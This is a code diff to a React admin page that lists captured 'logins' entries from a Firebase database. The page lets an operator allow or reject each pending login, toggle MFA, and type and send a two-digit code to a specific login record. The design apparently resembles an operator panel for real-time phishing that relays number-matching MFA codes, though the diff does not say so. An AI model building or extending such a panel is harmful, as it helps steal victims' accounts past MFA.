@@ -107,25 +107,62 @@ const Admin = () => {
                 <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
                 <td style={tdStyle}>{entry.status || "Pending"}</td>
                 <td style={tdStyle}>
-                  <button
-                    onClick={() => handleDecision(entry.id, "allowed")}
-                    disabled={entry.status === "allowed"}
-                    style={{ marginRight: "10px" }}
-                  >
-                    Allow
-                  </button>
-                  <button
-                    onClick={() => handleDecision(entry.id, "rejected")}
-                    disabled={entry.status === "rejected"}
-                  >
-                    Reject
-                  </button>
+                  <div style={{ marginBottom: "6px" }}>
+                    <input
+                      type="text"
+                      placeholder="Code"
+                      maxLength={2}
+                      style={{ width: "40px", marginRight: "6px" }}
+                      value={entry.tempCode || ""}
+                      onChange={(e) => {
+                        const code = e.target.value.replace(/\D/g, "");
+                        setLogins((prev) =>
+                          prev.map((item) =>
+                            item.id === entry.id ? { ...item, tempCode: code } : item
+                          )
+                        );
+                      }}
+                    />
+                    <button
+                      onClick={async () => {
+                        if (entry.tempCode) {
+                          await update(ref(database, `logins/${entry.id}`), {
+                            mfaCode: entry.tempCode,
+                          });
+                        }
+                      }}
+                      disabled={!entry.tempCode}
+                      style={{ marginRight: "6px" }}
+                    >
+                      Send Code
+                    </button>
+                  </div>
+
+                  <div style={{ marginBottom: "6px" }}>
+                    <button
+                      onClick={() => handleDecision(entry.id, "allowed")}
+                      disabled={entry.status === "allowed"}
+                      style={{ marginRight: "6px" }}
+                    >
+                      Allow
+                    </button>
+                    <button
+                      onClick={() => handleDecision(entry.id, "rejected")}
+                      disabled={entry.status === "rejected"}
+                    >
+                      Reject
+                    </button>
+                  </div>
+
+                  <div>
+                    <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
+                      {entry.mfa ? "Disable MFA" : "Enable MFA"}
+                    </button>
+                  </div>
                 </td>
-                <td style={tdStyle}>
-                  <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
-                    {entry.mfa ? "Disable MFA" : "Enable MFA"}
-                  </button>
-                </td>
+
+
+
               </tr>
             ))}
           </tbody>
